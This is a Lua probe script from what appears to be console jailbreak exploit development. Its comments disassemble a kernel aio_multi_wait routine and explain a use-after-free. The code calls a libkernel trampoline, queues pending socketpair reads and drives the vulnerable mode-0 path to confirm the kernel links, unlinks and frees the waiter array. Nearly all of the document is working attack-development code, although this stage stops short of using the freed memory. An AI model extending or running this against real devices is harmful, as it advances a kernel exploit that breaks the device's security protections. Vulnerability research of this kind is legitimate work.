-- CRASH_CLASS: HIGH
-- PROBE 1217a: aio_multi_wait mode 0, count 2, called through the argument-4 trampoline
--              libkernel+0x3B0+7 (proved by 1216b: out[0] became 0x80020003, the signature of
--              the mode-0 id loop, instead of the untouched 0xAAAAAAAA that an EINVAL leaves).
--
-- 13.60 body 0x3b0210, mode 0 at 0x3b08e5: every iteration reloads rcx = [rbx+0x40] (the waiter
-- array base) and links THAT SAME node onto the current request ([r13+0x50] = node,
-- node->next = old head, node->owner = r13). With count 2 the node is linked twice and its owner
-- is overwritten with the last request, so the cleanup loop at 0x3b0db0 (which unlinks through
-- node->owner) detaches it from the last request only. The array is freed at 0x3b0f93 while
-- request 0 still points into it. This is the Bagagwa/Relapse aio_multi_wait use-after-free.
--
-- This run only establishes that the kernel really takes this path: link, timeout, unlink,
-- free, process alive. It does not complete the requests, so nothing walks the freed node yet.

print("=== PROBE 1217a: aio_multi_wait mode 0 through the trampoline ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rd(a) local ok,v=pcall(function() return N(memory.read_dword(a)) end) if ok then return v end return -1 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function hilo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,N(v) end
local function call(tag, fn)
    local ok, rv = pcall(fn)
    if not ok then print(string.format("  [%s] PCALL-FAIL %s", tag, tostring(rv):sub(1,60))) return nil end
    local h,l = hilo(rv)
    print(string.format("  [%s] ret=0x%08X_%08X err=%s", tag, h, l, ES()))
    return rv
end

local pid0 = N(mk(20)())
local lk = N(libkernel_base)
local TRAMP = lk + 0x3B0 + 7
print(string.format("[0] pid=%d libkernel=0x%X trampoline=0x%X", pid0, lk, TRAMP))

local ids0 = memory.alloc(16)
local out0 = memory.alloc(16)
local tb0  = memory.alloc(8)
wd(ids0, 0) wd(ids0+4, 0) wd(tb0, 0) wd(out0, 0xAAAAAAAA)
call("tramp_sanity", function() return native.fcall_with_rax(TRAMP, 663, ids0, 1, out0, 0, tb0, 0) end)
print(string.format("    sanity out0=0x%08X (0x80020003 = argument 4 delivered, mode 0 ran)", rd(out0)))

print("[A] two pending reads on a socketpair")
local sv = memory.alloc(8) wd(sv,0) wd(sv+4,0)
call("socketpair", function() return mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv)) end)
local fd0, fd1 = rd(sv), rd(sv+4)
print(string.format("    fds=%d,%d", fd0, fd1))
if fd0 <= 0 then print("no socketpair"); print("=== DONE ===") return end

local buf = memory.alloc(0x100)
local ba = 0
do local ok,v = pcall(function() return N(uint64(buf)) end) if ok then ba = v end end
local reqs = memory.alloc(0x28*2)
local ids  = memory.alloc(16)
local st   = memory.alloc(16)
local out  = memory.alloc(16)
local tb   = memory.alloc(8)
local errs = memory.alloc(16)
for i=0,0x28*2-1,4 do wd(reqs+i,0) end
for i=0,1 do
    local r = reqs + i*0x28
    wd(r+0x08, 0x10)
    wd(r+0x10, ba % 4294967296) wd(r+0x14, math.floor(ba/4294967296))
    wd(r+0x20, fd0)
end
wd(ids,0) wd(ids+4,0)
call("submit", function() return mk(669)(uint64(0x1001),uint64(reqs),uint64(2),uint64(3),uint64(ids)) end)
local id0, id1 = rd(ids), rd(ids+4)
print(string.format("    id0=0x%08X id1=0x%08X", id0, id1))

local function poll(tag, arr, n)
    wd(st,0xEEEEEEEE) wd(st+4,0xEEEEEEEE)
    call(tag, function() return mk(664)(uint64(arr),uint64(n),uint64(st)) end)
    print(string.format("    state0=0x%08X state1=0x%08X", rd(st), rd(st+4)))
end
poll("poll_before", ids, 2)

print("[B] mode 0, count 2, timeout 2000us through the trampoline")
wd(tb, 2000) wd(out, 0xAAAAAAAA) wd(out+4, 0xAAAAAAAA)
local t0 = os.time and os.time() or 0
call("wait_mode0", function() return native.fcall_with_rax(TRAMP, 663, ids, 2, out, 0, tb, 0) end)
print(string.format("    out0=0x%08X out1=0x%08X", rd(out), rd(out+4)))
poll("poll_after", ids, 2)

print("[C] count 1 mode 0 control on the same pair (single node, no double link)")
local one = memory.alloc(8) wd(one, id0)
wd(tb, 2000) wd(out, 0xAAAAAAAA)
call("wait_mode0_n1", function() return native.fcall_with_rax(TRAMP, 663, one, 1, out, 0, tb, 0) end)
print(string.format("    out=0x%08X", rd(out)))

print("[D] delete both while still pending, then alive check")
call("delete", function() return mk(662)(uint64(ids),uint64(2),uint64(errs)) end)
print(string.format("    err0=0x%08X err1=0x%08X (0x80020010 = in flight)", rd(errs), rd(errs+4)))
print(string.format("[Z] pid_end=%d (start %d)", N(mk(20)()), pid0))
print("=== DONE ===")
